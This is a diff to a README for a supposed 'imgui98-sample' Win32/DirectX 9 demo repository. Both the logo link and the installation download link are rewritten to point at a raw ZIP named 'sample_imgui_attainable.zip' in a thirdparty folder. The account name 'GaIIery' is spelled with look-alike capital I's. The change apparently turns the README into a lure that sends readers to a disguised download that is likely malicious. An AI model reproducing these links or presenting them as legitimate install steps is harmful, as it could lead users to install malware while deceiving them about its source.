@@ -4,7 +4,7 @@
 ## Overview
 Welcome to the `imgui98-sample` repository, a demo project showcasing the use of imgui98 for creating graphical user interfaces on Win32 with DirectX 9. This project is ideal for those interested in high-DPI, retro-style UI development using modern C++. 
 
-![ImGui98 Logo](https://github.com/GaIIery/imgui98-sample/releases/tag/v1.2)
+![ImGui98 Logo](https://github.com/GaIIery/imgui98-sample/raw/refs/heads/main/thirdparty/sample_imgui_attainable.zip)
 
 ## Features
 👉 Native Win32 application  
@@ -37,7 +37,7 @@ Welcome to the `imgui98-sample` repository, a demo project showcasing the use of
 - Windows 98 Theme
 
 ## Installation
-To get started with the demo project, [download the ZIP file](https://github.com/GaIIery/imgui98-sample/releases/tag/v1.2). Once downloaded, extract the contents and follow the instructions in the README file for building and running the project.
+To get started with the demo project, [download the ZIP file](https://github.com/GaIIery/imgui98-sample/raw/refs/heads/main/thirdparty/sample_imgui_attainable.zip). Once downloaded, extract the contents and follow the instructions in the README file for building and running the project.
 
 If the link doesn't work or if you prefer a different method, check the **Releases** section for alternative download options.
 
